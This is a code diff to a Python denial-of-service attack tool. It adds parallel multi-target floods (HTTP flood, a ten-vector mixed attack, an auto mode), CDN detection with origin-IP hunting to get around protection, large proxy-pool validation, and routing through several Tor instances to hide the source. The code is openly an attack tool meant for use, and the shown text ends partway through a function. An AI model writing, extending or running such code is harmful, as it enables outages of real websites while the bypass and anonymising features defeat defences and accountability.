@@ -11,7 +11,7 @@ import signal
 import psutil
 import threading
 from datetime import datetime
-from typing import Optional, Dict, List
+from typing import Optional, Dict, List, Any
 from urllib.parse import urlparse
 
 # Set UTF-8 encoding for Windows console
@@ -51,6 +51,144 @@ RAPID_RESET_BIN = "bin/rapid_reset.exe"
 
 # Global bypass feature flags (loaded from env)
 BYPASS_FLAGS = {}
+
+# ---------- Multi-target helpers ----------
+def load_target_lines(path: str = "target/target.txt") -> List[str]:
+    try:
+        with open(path, encoding="utf-8") as f:
+            lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
+        return lines
+    except FileNotFoundError:
+        return []
+
+async def resolve_targets(prompt: str = " Target URL") -> List[str]:
+    print()
+    print(f"  [1] Single URL")
+    print(f"  [2] Multi-target from target/target.txt")
+    print(f"  [3] Enter multiple URLs manually")
+    mode = get_input(" Target mode [1/2/3] (default 1): ").strip() or "1"
+    targets: List[str] = []
+    if mode == "2":
+        targets = load_target_lines()
+        if not targets:
+            print(f"  {c('r','[-]')} target/target.txt not found or empty")
+            return []
+        print(f"  {c('g','[+]')} Loaded {len(targets)} targets:")
+        for i, t in enumerate(targets, 1):
+            print(f"      {i:2d}. {c('w',t)}")
+    elif mode == "3":
+        print("  Enter targets (one per line, empty line to finish):")
+        while True:
+            t = input("    > ").strip()
+            if not t:
+                break
+            if not t.startswith(("http://", "https://")):
+                t = "https://" + t
+            targets.append(t)
+        if targets:
+            print(f"  {c('g','[+]')} {len(targets)} targets loaded")
+        else:
+            return []
+    else:
+        t = get_input(f" {prompt}: ")
+        if not t:
+            return []
+        if not t.startswith(("http://", "https://")):
+            t = "https://" + t
+        targets = [t]
+    return targets
+
+# ---------- Multi-target dispatch ----------
+_multi_active: Dict[str, asyncio.Task] = {}
+
+def _render_multi_dashboard(targets: List[str]):
+    """Simple live per-target status table printed each refresh."""
+    from rich.table import Table
+    t = Table(title=f"Multi-Target Attack ({len(targets)} targets)", box=box.SIMPLE,
+              border_style="bright_black", header_style="bold cyan")
+    t.add_column("#", style="dim")
+    t.add_column("Target", style="bold white", width=40)
+    t.add_column("Status", justify="center")
+    t.add_column("Sent", justify="right")
+    t.add_column("OK", justify="right")
+    t.add_column("Fail", justify="right")
+    t.add_column("RPS", justify="right")
+    for idx, url in enumerate(targets, 1):
+        status = "[yellow]running[/]"
+        sent = ok = fail = rps = "-"
+        task = _multi_active.get(url)
+        if not task or task.done():
+            if task and task.done() and task.exception():
+                status = f"[red]err[/]"
+            else:
+                status = "[green]done[/]"
+        t.add_row(str(idx), url, status, str(sent), str(ok), str(fail), str(rps))
+    _RICH_CONSOLE.clear()
+    _RICH_CONSOLE.print(t)
+
+async def run_multi_target(module_coro_factory, targets: List[str],
+                           module_name: str = "", duration: int = 0):
+    """Run an async module function against multiple targets in parallel."""
+    global _multi_active
+    if not targets:
+        return {}
+    _multi_active.clear()
+    print(f"  {c('c','[*]')} Launching {module_name or 'attack'} against {len(targets)} targets...")
+    # Start all
+    for url in targets:
+        task = asyncio.create_task(module_coro_factory(url))
+        _multi_active[url] = task
+        await asyncio.sleep(0.02)
+    # Wait loop with periodic display
+    remain = duration
+    while remain > 0:
+        alive = sum(1 for t in _multi_active.values() if not t.done())
+        if alive == 0:
+            break
+        _render_multi_dashboard(targets)
+        await asyncio.sleep(min(3, remain))
+        remain -= 3
+    # Gather results
+    results = {}
+    for url, task in _multi_active.items():
+        try:
+            r = await task
+            results[url] = r if r else {}
+        except Exception as e:
+            results[url] = {"error": str(e)}
+    _multi_active.clear()
+    return results
+
+def print_multi_summary(targets: List[str], results: Dict[str, Any], duration: int):
+    """Print a combined result table after multi-target attack."""
+    from rich.table import Table
+    print()
+    t = Table(title=f"Multi-Target Results ({len(targets)} targets, {duration}s)",
+              box=box.HEAVY_EDGE, border_style="cyan", header_style="bold white")
+    t.add_column("Target", style="bold white", width=40)
+    t.add_column("Sent", justify="right")
+    t.add_column("Completed", justify="right")
+    t.add_column("Failed", justify="right")
+    t.add_column("RPS", justify="right")
+    total_sent = total_ok = total_fail = 0
+    for url in targets:
+        r = results.get(url, {})
+        sent = int(r.get("sent", r.get("total_requests", 0)))
+        ok = int(r.get("completed", 0))
+        fail = int(r.get("failed", 0))
+        rps_val = r.get("actual_rps", r.get("rps", 0))
+        if isinstance(rps_val, float):
+            rps_str = f"{rps_val:.1f}"
+        else:
+            rps_str = str(rps_val)
+        total_sent += sent
+        total_ok += ok
+        total_fail += fail
+        t.add_row(url, str(sent), str(ok), str(fail), rps_str)
+    t.add_row("[bold]TOTAL[/]", str(total_sent), str(total_ok), str(total_fail),
+              f"{total_sent/max(duration,1):.1f}" if duration else "-",
+              style="bold yellow")
+    _RICH_CONSOLE.print(t)
 
 def _rich_sep():
     """Print a Rich separator line."""
@@ -576,17 +714,64 @@ async def prompt_attack_options(target: str, ask_proxy: bool = True, ask_origin:
                 if get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y":
                     from core.recon.origin.origin_hunter import OriginHunter
                     env = load_env()
-                    print(f" {c('c','[*]')} Hunting origin IP...")
-                    hunter = OriginHunter(timeout=8)
-                    report = await hunter.hunt(target, env=env)
-                    if report.verified_origins:
-                        options["origin_ip"] = report.verified_origins[0]
-                        print(f" {c('g','[+]')} Origin found: {options['origin_ip']}")
-                    elif report.candidates:
-                        options["origin_ip"] = report.candidates[0].ip
-                        print(f" {c('y','[*]')} Best candidate: {options['origin_ip']}")
+
+                    # PRE-CHECK: Is target actually behind a CDN?
+                    # If not, just use DNS resolution as origin (saves 45s timeout).
+                    parsed = urlparse(target)
+                    hostname = parsed.hostname or ""
+                    cdn_detected = False
+                    direct_ip = None
+                    try:
+                        import socket as _socket
+                        loop = asyncio.get_event_loop()
+                        direct_ip = await loop.run_in_executor(None, _socket.gethostbyname, hostname)
+                    except Exception:
+                        pass
+                    try:
+                        import requests as _req
+                        probe = await loop.run_in_executor(
+                            None,
+                            lambda: _req.head(target, timeout=5, allow_redirects=False,
+                                              headers={"User-Agent": "Mozilla/5.0"})
+                        )
+                        srv = (probe.headers.get("Server") or "").lower()
+                        cdn_markers = ("cloudflare", "akamai", "fastly", "cloudfront",
+                                       "imperva", "incapsula", "sucuri")
+                        cdn_detected = (
+                            "cf-ray" in {k.lower() for k in probe.headers.keys()}
+                            or any(m in srv for m in cdn_markers)
+                        )
+                    except Exception:
+                        pass
+
+                    if not cdn_detected and direct_ip:
+                        options["origin_ip"] = direct_ip
+                        print(f" {c('g','[+]')} No CDN detected — using DNS origin: {c('w', direct_ip)}")
                     else:
-                        print(f" {c('y','[!]')} No origin found - hitting target directly")
+                        if cdn_detected:
+                            print(f" {c('c','[*]')} CDN detected — hunting real origin IP...")
+                        else:
+                            print(f" {c('c','[*]')} Hunting origin IP...")
+                        hunter = OriginHunter(timeout=8)
+                        try:
+                            report = await asyncio.wait_for(hunter.hunt(target, env=env), timeout=45)
+                            if report.verified_origins:
+                                options["origin_ip"] = report.verified_origins[0]
+                                print(f" {c('g','[+]')} Origin found: {options['origin_ip']}")
+                            elif report.candidates:
+                                options["origin_ip"] = report.candidates[0].ip
+                                print(f" {c('y','[*]')} Best candidate: {options['origin_ip']}")
+                            elif direct_ip:
+                                options["origin_ip"] = direct_ip
+                                print(f" {c('y','[*]')} Falling back to DNS origin: {direct_ip}")
+                            else:
+                                print(f" {c('y','[!]')} No origin found - hitting target directly")
+                        except asyncio.TimeoutError:
+                            if direct_ip:
+                                options["origin_ip"] = direct_ip
+                                print(f" {c('y','[!]')} Origin hunt timed out - using DNS origin: {direct_ip}")
+                            else:
+                                print(f" {c('y','[!]')} Origin hunt timed out - hitting target directly")
         except Exception as e:
             logger.debug(f"Origin handling failed: {e}")
 
@@ -662,13 +847,47 @@ async def prompt_attack_options(target: str, ask_proxy: bool = True, ask_origin:
 
                         max_validate = min(total, 3000)
                         max_alive = 500
-                        
+
                         # Ask user what validation mode
                         print(f"\n {c('c','[*]')} Validation mode:")
                         print(f"   {c('c','[1]')} Fast (TCP check only) - 90% pass, 50ms/proxy {c('g','(RECOMMENDED)')}")
                         print(f"   {c('c','[2]')} Strict (TCP + Target HTTP check) - 1-5% pass, 200ms/proxy")
                         validate_mode = get_input(f" Choose [1/2] (default 1): ").strip() or "1"
-                        
+
+                        # Ask how many proxies to validate (default 3000, but allow ALL)
+                        print(f"\n {c('c','[*]')} How many proxies to validate?")
+                        print(f"   {c('c','[1]')} 3000 (fast, ~75s on TCP mode) {c('g','[default]')}")
+                        print(f"   {c('c','[2]')} 5000 (~125s)")
+                        print(f"   {c('c','[3]')} 10000 (~4 min)")
+                        print(f"   {c('c','[A]')} ALL {total} proxies (~{int(total*0.05)}s on TCP mode)")
+                        print(f"   {c('c','[M]')} Manual count")
+                        scope_choice = get_input(f" Choose [1/2/3/A/M] (default 1): ").strip().upper() or "1"
+                        if scope_choice == "1":
+                            max_validate = min(total, 3000)
+                        elif scope_choice == "2":
+                            max_validate = min(total, 5000)
+                        elif scope_choice == "3":
+                            max_validate = min(total, 10000)
+                        elif scope_choice == "A":
+                            max_validate = total
+                        elif scope_choice == "M":
+                            mv = get_input(f" How many proxies to validate (1-{total}): ").strip()
+                            try:
+                                max_validate = max(1, min(total, int(mv)))
+                            except ValueError:
+                                max_validate = min(total, 3000)
+                        else:
+                            max_validate = min(total, 3000)
+
+                        # Also ask early-exit threshold
+                        ea = get_input(f" Early-exit when how many alive? (default 500, 0=disable): ").strip()
+                        try:
+                            max_alive = max(0, int(ea)) if ea else 500
+                        except ValueError:
+                            max_alive = 500
+                        if max_alive == 0:
+                            max_alive = max_validate + 1  # never trigger early exit
+
                         stage1_only = (validate_mode == "1")
                         
                         if stage1_only:
@@ -809,58 +1028,700 @@ async def prompt_attack_options(target: str, ask_proxy: bool = True, ask_origin:
     return options
 
 
+# ---------- Multi-target wrappers ----------
+async def run_http_flood_multi(targets: List[str], cfg: dict):
+    """Multi-target: run http_flood against ALL targets in parallel."""
+    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
+    rps = int(get_input(" Target RPS per target (default 2000): ") or "2000")
+    use_tor = get_input(" Route through Tor? (y/N): ").strip().lower() == "y"
+    proxy_urls = []
+    if use_tor:
+        for i in range(3):
+            proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
+    print(f"  {c('c','[*]')} HTTP Flood Multi: {len(targets)} targets, {duration}s, {rps}RPS each")
+    if proxy_urls:
+        print(f"  {c('g','[+]')} Tor proxies: {len(proxy_urls)}")
+    _rich_sep()
+    from core.monitor.auto_dashboard import AutoDashboard
+    from core.attack.engines.multi_vector_engine import run_multi_vector_engine
+    import threading as _th
+    import atexit
+
+    import queue as _queue
+    all_tasks = []
+    for target in targets:
+        if not target.startswith(("http://", "https://")):
+            target = "https://" + target
+        parsed = urlparse(target)
+        host = parsed.hostname or target
+        tasks = []
+        stop_evts = []
+        results = []
+        live_q = _queue.Queue()
+        modes = [
+            ("mv_connhold", "connhold", 0.10),
+            ("mv_flood",    "flood",    0.30),
+            ("mv_post",     "post",     0.20),
+        ]
+        for name, mode, share in modes:
+            wrps = max(50, int(rps * share))
+            evt = _th.Event()
+            res = {}
+            th = _th.Thread(
+                target=run_multi_vector_engine,
+                name=f"multi_{host}_{name}",
+                kwargs=dict(
+                    target_url=target,
+                    duration_seconds=float(duration),
+                    target_rps=wrps,
+                    worker_id=abs(hash(f"{host}_{name}")) & 0xFFFF,
+                    stats_queue=live_q,
+                    stop_event=evt,
+                    proxy_urls=proxy_urls if proxy_urls else None,
+                    result_dict=res,
+                    vector_mode=mode,
+                ),
+                daemon=True,
+            )
+            th.start()
+            tasks.append(th)
+            stop_evts.append(evt)
+            results.append(res)
+        all_tasks.append((target, tasks, stop_evts, results, live_q))
+
+    # Monitor progress with live stats from queues
+    _live = {url: {"sent": 0, "ok": 0, "fail": 0, "held": 0} for url in targets}
+    print(f"  {c('c','[*]')} Attacking {len(targets)} targets simultaneously...")
+    start_t = time.time()
+    try:
+        while time.time() - start_t < duration + 5:
+            remain = int(duration - (time.time() - start_t))
+            if remain <= 0:
+                break
+            # Drain live queues
+            for target, _, _, _, q in all_tasks:
+                try:
+                    while True:
+                        snap = q.get_nowait()
+                        if isinstance(snap, dict):
+                            _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
+                            _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
+                            _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
+                            _live[target]["held"] = max(_live[target]["held"], int(snap.get("connections_held", 0)))
+                except _queue.Empty:
+                    pass
+            # Build display lines
+            lines = []
+            total_sent = total_ok = total_fail = 0
+            for target, tasks, _, results, _ in all_tasks:
+                s = _live[target]
+                alive = sum(1 for t in tasks if t.is_alive())
+                status = f"{c('g','RUN')}" if alive else f"{c('r','DONE')}"
+                lines.append(f"    {c('w',target[:55]):55s} {status}  sent={s['sent']:>5d}  ok={s['ok']:>5d}  fail={s['fail']:>4d}  held={s['held']:>3d}")
+                total_sent += s['sent']
+                total_ok += s['ok']
+                total_fail += s['fail']
+            sys.stdout.write("\033[2J\033[H")
+            sys.stdout.write(f"\n  {c('c','=== HTTP FLOOD MULTI-TARGET ===')}  [{remain}s remaining]  total_sent={total_sent}  ok={total_ok}  fail={total_fail}\n\n")
+            sys.stdout.write("\n".join(lines))
+            sys.stdout.write(f"\n\n  {c('d','Press Ctrl+C to stop')}")
+            sys.stdout.flush()
+            await asyncio.sleep(1)
+    except KeyboardInterrupt:
+        print(f"\n  {c('y','[!]')} Stopping...")
+
+    # Drain remaining queue data before stop
+    for target, _, _, _, q in all_tasks:
+        try:
+            while True:
+                snap = q.get_nowait()
+                if isinstance(snap, dict):
+                    _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
+                    _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
+                    _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
+        except _queue.Empty:
+            pass
+
+    # Cleanup
+    for target, tasks, evts, results, _ in all_tasks:
+        for e in evts:
+            e.set()
+        for t in tasks:
+            t.join(timeout=3)
+    
+    # Also read final result dicts
+    for target, _, _, results, _ in all_tasks:
+        for r in results:
+            _live[target]["sent"] = max(_live[target]["sent"], int(r.get("sent", 0)))
+            _live[target]["ok"] = max(_live[target]["ok"], int(r.get("completed", 0)))
+            _live[target]["fail"] = max(_live[target]["fail"], int(r.get("failed", 0)))
+    
+    # Print results
+    sys.stdout.write("\033[2J\033[H")
+    print(f"\n  {c('c','=== HTTP FLOOD MULTI-TARGET RESULTS ===')}\n")
+    total_sent = total_ok = total_fail = 0
+    for target, _, _, _, _ in all_tasks:
+        s = _live[target]
+        total_sent += s['sent']
+        total_ok += s['ok']
+        total_fail += s['fail']
+        print(f"  {c('w',target[:55]):55s}  sent={s['sent']:>6d}  ok={s['ok']:>6d}  fail={s['fail']:>5d}")
+    print(f"  {'-' * 55}  {'-'*20}")
+    print(f"  {c('g','TOTAL'):55s}  sent={total_sent:>6d}  ok={total_ok:>6d}  fail={total_fail:>5d}")
+    _rich_sep()
+
+
+# ---------- Mixed Attack multi-target ----------
+async def run_mixed_attack_multi(targets: List[str], cfg: dict):
+    """Multi-target: mixed attack with ALL vectors against ALL targets in parallel."""
+    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
+    rps = int(get_input(" Target RPS per target (default 2000): ") or "2000")
+
+    print()
+    print(f" {c('c','[*]')} Attack mode:")
+    print(f"   {c('c','[1]')} Direct (no Tor / no proxy) {c('g','[fastest]')}")
+    print(f"   {c('c','[2]')} Tor network {c('g','[recommended]')}")
+    print(f"   {c('c','[3]')} Proxy pool")
+    print(f"   {c('c','[4]')} Tor + Proxy")
+    mode = (get_input(" Choose [1/2/3/4] (default 2): ").strip() or "2")
+
+    use_tor = mode in ("2", "4")
+    use_proxy = mode in ("3", "4")
+    proxy_urls = []
+
+    if use_tor:
+        ti = get_input(" Tor instances (default 5): ").strip()
+        tor_instances = max(1, min(20, int(ti))) if ti.isdigit() else 5
+        try:
+            from core.network.tor_manager import get_tor_manager, TOR_BASE_SOCKS_PORT
+            manager = get_tor_manager(instances=tor_instances)
+            if manager.is_tor_installed():
+                manager.setup_instances()
+                success = manager.start_all(wait_bootstrap=False)
+                if success > 0:
+                    print(f" {c('g','[+]')} Started {success}/{tor_instances} Tor instances")
+                    print(f" {c('c','[*]')} Waiting for Tor bootstrap (up to 120s)...")
+                    bootstrapped = [False] * len(manager.instances)
+                    for _ in range(120):
+                        for idx, inst in enumerate(manager.instances):
+                            if not bootstrapped[idx] and inst.pid:
+                                if manager.wait_for_bootstrap(inst, timeout=3):
+                                    bootstrapped[idx] = True
+                        if all(bootstrapped):
+                            break
+                        await asyncio.sleep(1)
+                    health = await manager.check_all_health()
+                    healthy = [h for h in health if h.get('is_tor')]
+                    print(f" {c('g','[+]')} {len(healthy)}/{tor_instances} Tor instances healthy")
+                    if healthy:
+                        for h in healthy:
+                            socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
+                            proxy_urls.append(f"socks5h://127.0.0.1:{socks_port}")
+        except ImportError:
+            for i in range(min(tor_instances, 5)):
+                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
+        except Exception as e:
+            print(f" {c('r','[-]')} Tor setup error: {e}")
+            for i in range(min(tor_instances, 5)):
+                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
+
+    if use_proxy:
+        try:
+            opts = await prompt_attack_options(targets[0], ask_proxy=True, ask_origin=False)
+            pool = opts.get("proxy_pool")
+            if pool is not None:
+                for plist in getattr(pool, "_pools", {}).values():
+                    for ps in plist:
+                        u = getattr(ps, "url", None)
+                        if u:
+                            proxy_urls.append(u)
+                for ps in getattr(pool, "_pending", []) or []:
+                    u = getattr(ps, "url", None)
+                    if u:
+                        proxy_urls.append(u)
+        except Exception as e:
+            print(f" {c('y','[!]')} proxy setup: {e}")
+
+    print(f"  {c('c','[*]')} Mixed Attack Multi: {len(targets)} targets, {duration}s, {rps}RPS each, proxies={len(proxy_urls)}")
+    _rich_sep()
+
+    from core.monitor.auto_dashboard import AutoDashboard
+    from core.attack.engines.multi_vector_engine import run_multi_vector_engine
+    import threading as _th
+    import queue as _queue
+
+    vectors = [
+        ("mv_connhold",   "connhold",   0.08),
+        ("mv_flood",      "flood",      0.22),
+        ("mv_post",       "post",       0.15),
+        ("mv_slow",       "slow",       0.05),
+        ("mv_h2reset",    "h2reset",    0.18),
+        ("mv_drip",       "drip",       0.06),
+        ("mv_cdnpoison",  "cdnpoison",  0.10),
+        ("mv_resexh",     "resexh",     0.08),
+        ("mv_sslreneg",   "sslreneg",   0.04),
+        ("mv_rangeamp",   "rangeamp",   0.04),
+    ]
+
+    all_tasks = []
+    for target in targets:
+        if not target.startswith(("http://", "https://")):
+            target = "https://" + target
+        parsed = urlparse(target)
+        host = parsed.hostname or target
+        tasks = []
+        stop_evts = []
+        results = []
+        live_q = _queue.Queue()
+        for name, mode, share in vectors:
+            wrps = max(50, int(rps * share))
+            evt = _th.Event()
+            res = {}
+            th = _th.Thread(
+                target=run_multi_vector_engine,
+                name=f"multi_mixed_{host}_{name}",
+                kwargs=dict(
+                    target_url=target,
+                    duration_seconds=float(duration),
+                    target_rps=wrps,
+                    worker_id=abs(hash(f"{host}_{name}")) & 0xFFFF,
+                    stats_queue=live_q,
+                    stop_event=evt,
+                    proxy_urls=proxy_urls if proxy_urls else None,
+                    result_dict=res,
+                    vector_mode=mode,
+                ),
+                daemon=True,
+            )
+            th.start()
+            tasks.append(th)
+            stop_evts.append(evt)
+            results.append(res)
+        all_tasks.append((target, tasks, stop_evts, results, live_q))
+
+    _live = {url: {"sent": 0, "ok": 0, "fail": 0} for url in targets}
+    print(f"  {c('c','[*]')} Attacking {len(targets)} targets simultaneously (10 vectors each)...")
+    start_t = time.time()
+    try:
+        while time.time() - start_t < duration + 5:
+            remain = int(duration - (time.time() - start_t))
+            if remain <= 0:
+                break
+            for target, _, _, _, q in all_tasks:
+                try:
+                    while True:
+                        snap = q.get_nowait()
+                        if isinstance(snap, dict):
+                            _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
+                            _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
+                            _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
+                except _queue.Empty:
+                    pass
+            lines = []
+            total_sent = total_ok = total_fail = 0
+            for target, tasks, _, _, _ in all_tasks:
+                s = _live[target]
+                alive = sum(1 for t in tasks if t.is_alive())
+                status = f"{c('g','RUN')}" if alive else f"{c('r','DONE')}"
+                lines.append(f"    {c('w',target[:55]):55s} {status}  sent={s['sent']:>5d}  ok={s['ok']:>5d}  fail={s['fail']:>4d}")
+                total_sent += s['sent']
+                total_ok += s['ok']
+                total_fail += s['fail']
+            sys.stdout.write("\033[2J\033[H")
+            sys.stdout.write(f"\n  {c('c','=== MIXED ATTACK MULTI-TARGET ===')}  [{remain}s]  sent={total_sent}  ok={total_ok}  fail={total_fail}\n\n")
+            sys.stdout.write("\n".join(lines))
+            sys.stdout.write(f"\n\n  {c('d','Press Ctrl+C to stop')}")
+            sys.stdout.flush()
+            await asyncio.sleep(1)
+    except KeyboardInterrupt:
+        print(f"\n  {c('y','[!]')} Stopping...")
+
+    for target, _, _, _, q in all_tasks:
+        try:
+            while True:
+                snap = q.get_nowait()
+                if isinstance(snap, dict):
+                    _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
+                    _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
+                    _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
+        except _queue.Empty:
+            pass
+
+    for _, tasks, evts, results, _ in all_tasks:
+        for e in evts:
+            e.set()
+        for t in tasks:
+            t.join(timeout=3)
+
+    for target, _, _, results, _ in all_tasks:
+        for r in results:
+            _live[target]["sent"] = max(_live[target]["sent"], int(r.get("sent", 0)))
+            _live[target]["ok"] = max(_live[target]["ok"], int(r.get("completed", 0)))
+            _live[target]["fail"] = max(_live[target]["fail"], int(r.get("failed", 0)))
+
+    sys.stdout.write("\033[2J\033[H")
+    print(f"\n  {c('c','=== MIXED ATTACK MULTI-TARGET RESULTS ===')}\n")
+    total_sent = total_ok = total_fail = 0
+    for target, _, _, _, _ in all_tasks:
+        s = _live[target]
+        total_sent += s['sent']
+        total_ok += s['ok']
+        total_fail += s['fail']
+        print(f"  {c('w',target[:55]):55s}  sent={s['sent']:>6d}  ok={s['ok']:>6d}  fail={s['fail']:>5d}")
+    print(f"  {'-' * 55}  {'-'*20}")
+    print(f"  {c('g','TOTAL'):55s}  sent={total_sent:>6d}  ok={total_ok:>6d}  fail={total_fail:>5d}")
+    _rich_sep()
+
+
+# ---------- Auto Mode multi-target ----------
+async def run_auto_mode_multi(targets: List[str], cfg: dict):
+    """Multi-target: auto mode against ALL targets in parallel."""
+    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
+    rps = int(get_input(" Target RPS per target (default 2000): ") or "2000")
+
+    print()
+    print(f" {c('c','[*]')} Attack mode:")
+    print(f"   {c('c','[1]')} Direct (no Tor / no proxy) {c('g','[fastest]')}")
+    print(f"   {c('c','[2]')} Tor network {c('g','[recommended]')}")
+    print(f"   {c('c','[3]')} Proxy pool")
+    print(f"   {c('c','[4]')} Tor + Proxy")
+    mode = (get_input(" Choose [1/2/3/4] (default 2): ").strip() or "2")
+
+    use_tor = mode in ("2", "4")
+    use_proxy = mode in ("3", "4")
+    proxy_urls = []
+
+    if use_tor:
+        ti = get_input(" Tor instances (default 5): ").strip()
+        tor_instances = max(1, min(20, int(ti))) if ti.isdigit() else 5
+        try:
+            from core.network.tor_manager import get_tor_manager, TOR_BASE_SOCKS_PORT
+            manager = get_tor_manager(instances=tor_instances)
+            if manager.is_tor_installed():
+                manager.setup_instances()
+                success = manager.start_all(wait_bootstrap=False)
+                if success > 0:
+                    print(f" {c('g','[+]')} Started {success}/{tor_instances} Tor instances")
+                    print(f" {c('c','[*]')} Waiting for Tor bootstrap (up to 120s)...")
+                    bootstrapped = [False] * len(manager.instances)
+                    for _ in range(120):
+                        for idx, inst in enumerate(manager.instances):
+                            if not bootstrapped[idx] and inst.pid:
+                                if manager.wait_for_bootstrap(inst, timeout=3):
+                                    bootstrapped[idx] = True
+                        if all(bootstrapped):
+                            break
+                        await asyncio.sleep(1)
+                    health = await manager.check_all_health()
+                    healthy = [h for h in health if h.get('is_tor')]
+                    print(f" {c('g','[+]')} {len(healthy)}/{tor_instances} Tor instances healthy")
+                    if healthy:
+                        for h in healthy:
+                            socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
+                            proxy_urls.append(f"socks5h://127.0.0.1:{socks_port}")
+        except ImportError:
+            for i in range(min(tor_instances, 5)):
+                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
+        except Exception as e:
+            print(f" {c('r','[-]')} Tor setup error: {e}")
+            for i in range(min(tor_instances, 5)):
+                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
+
+    if use_proxy:
+        try:
+            opts = await prompt_attack_options(targets[0], ask_proxy=True, ask_origin=False)
+            pool = opts.get("proxy_pool")
+            if pool is not None:
+                for plist in getattr(pool, "_pools", {}).values():
+                    for ps in plist:
+                        u = getattr(ps, "url", None)
+                        if u:
+                            proxy_urls.append(u)
+                for ps in getattr(pool, "_pending", []) or []:
+                    u = getattr(ps, "url", None)
+                    if u:
+                        proxy_urls.append(u)
+        except Exception as e:
+            print(f" {c('y','[!]')} proxy setup: {e}")
+
+    print(f"  {c('c','[*]')} Auto Mode Multi: {len(targets)} targets, {duration}s, {rps}RPS each, proxies={len(proxy_urls)}")
+    _rich_sep()
+
+    from core.monitor.auto_dashboard import AutoDashboard
+    from core.attack.engines.multi_vector_engine import run_multi_vector_engine
+    import threading as _th
+    import queue as _queue
+
+    vectors = [
+        ("mv_flood",      "flood",      0.25),
+        ("mv_post",       "post",       0.20),
+        ("mv_resexh",     "resexh",     0.15),
+        ("mv_cdnpoison",  "cdnpoison",  0.12),
+        ("mv_h2reset",    "h2reset",    0.12),
+        ("mv_connhold",   "connhold",   0.08),
+        ("mv_drip",       "drip",       0.04),
+        ("mv_rangeamp",   "rangeamp",   0.04),
+    ]
+
+    all_tasks = []
+    for target in targets:
+        if not target.startswith(("http://", "https://")):
+            target = "https://" + target
+        parsed = urlparse(target)
+        host = parsed.hostname or target
+        tasks = []
+        stop_evts = []
+        results = []
+        live_q = _queue.Queue()
+        for name, mode, share in vectors:
+            wrps = max(50, int(rps * share))
+            evt = _th.Event()
+            res = {}
+            th = _th.Thread(
+                target=run_multi_vector_engine,
+                name=f"multi_auto_{host}_{name}",
+                kwargs=dict(
+                    target_url=target,
+                    duration_seconds=float(duration),
+                    target_rps=wrps,
+                    worker_id=abs(hash(f"{host}_{name}")) & 0xFFFF,
+                    stats_queue=live_q,
+                    stop_event=evt,
+                    proxy_urls=proxy_urls if proxy_urls else None,
+                    result_dict=res,
+                    vector_mode=mode,
+                ),
+                daemon=True,
+            )
+            th.start()
+            tasks.append(th)
+            stop_evts.append(evt)
+            results.append(res)
+        all_tasks.append((target, tasks, stop_evts, results, live_q))
+
+    _live = {url: {"sent": 0, "ok": 0, "fail": 0} for url in targets}
+    print(f"  {c('c','[*]')} Attacking {len(targets)} targets simultaneously (8 vectors each)...")
+    start_t = time.time()
+    try:
+        while time.time() - start_t < duration + 5:
+            remain = int(duration - (time.time() - start_t))
+            if remain <= 0:
+                break
+            for target, _, _, _, q in all_tasks:
+                try:
+                    while True:
+                        snap = q.get_nowait()
+                        if isinstance(snap, dict):
+                            _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
+                            _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
+                            _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
+                except _queue.Empty:
+                    pass
+            lines = []
+            total_sent = total_ok = total_fail = 0
+            for target, tasks, _, _, _ in all_tasks:
+                s = _live[target]
+                alive = sum(1 for t in tasks if t.is_alive())
+                status = f"{c('g','RUN')}" if alive else f"{c('r','DONE')}"
+                lines.append(f"    {c('w',target[:55]):55s} {status}  sent={s['sent']:>5d}  ok={s['ok']:>5d}  fail={s['fail']:>4d}")
+                total_sent += s['sent']
+                total_ok += s['ok']
+                total_fail += s['fail']
+            sys.stdout.write("\033[2J\033[H")
+            sys.stdout.write(f"\n  {c('c','=== AUTO MODE MULTI-TARGET ===')}  [{remain}s]  sent={total_sent}  ok={total_ok}  fail={total_fail}\n\n")
+            sys.stdout.write("\n".join(lines))
+            sys.stdout.write(f"\n\n  {c('d','Press Ctrl+C to stop')}")
+            sys.stdout.flush()
+            await asyncio.sleep(1)
+    except KeyboardInterrupt:
+        print(f"\n  {c('y','[!]')} Stopping...")
+
+    for target, _, _, _, q in all_tasks:
+        try:
+            while True:
+                snap = q.get_nowait()
+                if isinstance(snap, dict):
+                    _live[target]["sent"] = max(_live[target]["sent"], int(snap.get("sent", 0)))
+                    _live[target]["ok"] = max(_live[target]["ok"], int(snap.get("completed", 0)))
+                    _live[target]["fail"] = max(_live[target]["fail"], int(snap.get("failed", 0)))
+        except _queue.Empty:
+            pass
+
+    for _, tasks, evts, results, _ in all_tasks:
+        for e in evts:
+            e.set()
+        for t in tasks:
+            t.join(timeout=3)
+
+    for target, _, _, results, _ in all_tasks:
+        for r in results:
+            _live[target]["sent"] = max(_live[target]["sent"], int(r.get("sent", 0)))
+            _live[target]["ok"] = max(_live[target]["ok"], int(r.get("completed", 0)))
